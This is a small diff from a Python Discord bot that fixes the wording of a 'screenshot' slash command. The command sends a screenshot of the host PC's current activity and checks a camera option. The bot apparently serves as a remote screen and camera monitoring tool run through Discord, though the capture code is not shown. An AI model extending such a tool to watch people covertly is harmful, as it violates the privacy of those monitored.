@@ -35,7 +35,7 @@ async def on_ready():
         await bot.tree.sync()
         print("The command tree has been synced.")
 
-@bot.tree.command(name="screenshot", description="sends a screenshot of what host is currently doing on their pc")
+@bot.tree.command(name="screenshot", description="sends a screenshot of what the host is currently doing on their pc")
 async def Screenshot(interaction: discord.Interaction):
 
     if (useCamera.lower() == "y"):
